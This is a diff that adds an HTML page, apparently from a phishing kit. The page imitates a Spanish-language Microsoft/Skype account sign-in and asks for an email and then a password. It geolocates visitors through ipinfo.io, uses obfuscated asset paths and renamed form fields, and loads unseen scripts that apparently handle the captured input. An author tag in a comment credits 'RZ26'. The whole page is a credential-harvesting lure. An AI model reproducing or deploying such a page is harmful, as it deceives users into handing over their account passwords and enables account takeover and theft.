@@ -1,0 +1,150 @@
+<html dir="ltr"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<title>Habilitar mi cuenta</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
+<link rel="shortcut icon" href="tnzcbmvziepizdancvxhwhmnjebkpi/img/favicon.ico">
+<link rel="stylesheet" title="pagina" type="text/css" href="tnzcbmvziepizdancvxhwhmnjebkpi/ccs/stylo.css">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<style type="text/css">body{display:block !important;}</style>
+</head>
+ <script>
+         $.getJSON("https://ipinfo.io", function (response) {
+    $("#address").html("" + response.city + ", " + response.country);
+    
+})
+      </script> 
+   <p id="address"  hidden="">
+
+<body class="fa"  >
+<div>
+<div  class="divfull" >
+</div>
+<div data-bind="if: activeDialog"></div> 
+<div class="outer" >
+<div class="middle"  >
+                            <div class="inner fade-in-lightbox" style="height: 100%; width: 100%; left: 0;"> 
+                    
+                                <div class="lightbox-cover" ></div>
+                                <div data-bind="component: { name: 'logo-control',}">
+                                    <img class="logo" role="img" src="tnzcbmvziepizdancvxhwhmnjebkpi/img/logotype.png"></div>
+                                <div style="display: inherit;" id="cargaCorreo" role="main" data-bind="component: { name: 'pagination-control',publicMethods: paginationControlMethods, }">
+                                    <div><div class="pagination-view animate slide-in-next">
+                                            <div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',}">
+                                                <div data-bind="component: { name: 'header-control',}">
+                                                    <div class="row text-title" id="l0ginHeader">
+                                                        <div role="heading" aria-level="1" data-bind="text: title">Iniciar sesión</div></div></div>
+                                                <div class="row">
+                                                    <div class="form-group col-md-24">
+                                                        <div id="error" class="error"></div>
+                                                        
+                                                        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',publicMethods: usernameTextbox.placeholderTextboxMethods}"> 
+                                                            <input autocomplete="off" 
+                                                            onkeypress="return continuar22(event);"
+                                                             type="text" id="email" name="em4il" maxlength="120" class="form-control" aria-required="true" aria-describedby="l0ginHeader" 
+                                                            placeholder="Correo electrónico, teléfono o Skype" onkeyup="validar()" tabindex="0" required=""> </div>
+                                                    </div>
+                                                    <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links">
+                                                                    <div class="form-group" data-bind="">¿No tiene una cuenta? <a href="javascript:void(0)" id="elefante3" name="elefante3">Cree una.</a></div>
+                                                                    <div class="form-group"> <a id="elefante2" name="elefante2" href="javascript:void(0)">Iniciar sesión con una llave de seguridad</a> <span class="help-button" role="button" tabindex="0">
+                                                                        <img role="presentacion" src="tnzcbmvziepizdancvxhwhmnjebkpi/img/documentation.svg"></span>
+                                                                    </div>
+                                                                    <div class="form-group">
+    
+                                                                        <div class="form-group"><a id="elefante4" href="javascript:void(0)">Opciones de inicio de sesion</a></div></div></div> </div> </div> 
+                                                                        <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field'}">
+                                                                <div class="col-xs-24 no-padding-left-right button-container" data-bind="">
+    
+                                                                    <div class="inline-block">
+                                                                        <button type="button"  id="botonsito" class="btn btn-block btn-primary">Siguiente</button>
+    
+                                                                    </div> 
+                                     </div>
+                                                            </div> 
+                                                        </div> </div></div>
+                                            </div> </div></div>
+                                </div>
+                                <div style="display:none" id="cargaClave" role="main" data-bind="component: { name: 'pagination-control',publicMethods: paginationControlMethods, }">
+                                    <div>
+                                        <div class="animate slide-in-next">
+                                            <div class="identityBanner">
+                                                <div  id="regresar" class="backButton" style="padding-top: 1px;">
+                                                    <img src="tnzcbmvziepizdancvxhwhmnjebkpi/img/arrow_left.svg" alt="arrow left" />
+                                                </div>
+                                                <div id="nombreListo" class="identity"></div>
+                                            </div>
+                                        </div>
+                                        <div class="pagination-view animate has-identity-banner slide-in-next">
+                                            <div class="row text-title">
+                                                Escribir contraseña
+                                            </div>
+                                            <div class="row">
+                                                <div class="form-group col-md-24">
+                                                    <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',publicMethods: usernameTextbox.placeholderTextboxMethods}"> 
+                                                        <input autocomplete="off" onkeypress="return continuar2(event);" type="password" id="pass" required name="p4ss" class="form-control" placeholder="Contraseña"> 
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="position-buttons">
+                                                <div>
+                                                    <div class="row">
+                                                        <div class="col-md-24">
+                                                            <div class="text-13">
+                                                                <div class="form-group">
+                                                                    <a href="#">¿Olvidó su contraseña?</a>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="win-button-pin-bottom">
+                                                    <div class="row">
+                                                        <div class="col-xs-24 no-padding-left-right button-container">
+                                                            <div class="inline-block">
+                                                                <button onclick="" id="botonsito2" type="submit" class="btn btn-block btn-primary">Iniciar sesión</button>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                    </div>
+                                </div>
+
+                            </div>
+
+
+<script src="tnzcbmvziepizdancvxhwhmnjebkpi/gbppnctnyfdqcbkdnvbiywbxiyhwrr/rz.js"></script>
+<script>
+function continuar22(e)
+{
+    //SCRIPTS CREADOS POR RZ26 EL QUE COPIE ME LO MAMA
+    e = e || window.event;
+    if (e.keyCode == 13)
+    {
+        document.getElementById('botonsito').click();
+        return false;
+    }
+    return true;
+}
+
+function continuar2(e)
+{
+    e = e || window.event;
+    if (e.keyCode == 13)
+    {
+        document.getElementById('botonsito2').click();
+        return false;
+    }
+    return true;
+}
+</script>
+
+    
+                    </div> 
+            </div></div></form>
+ 
+    <script src="tnzcbmvziepizdancvxhwhmnjebkpi/gbppnctnyfdqcbkdnvbiywbxiyhwrr/funciones.js" type="text/javascript"></script>
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+
+    </body>
+            </html>
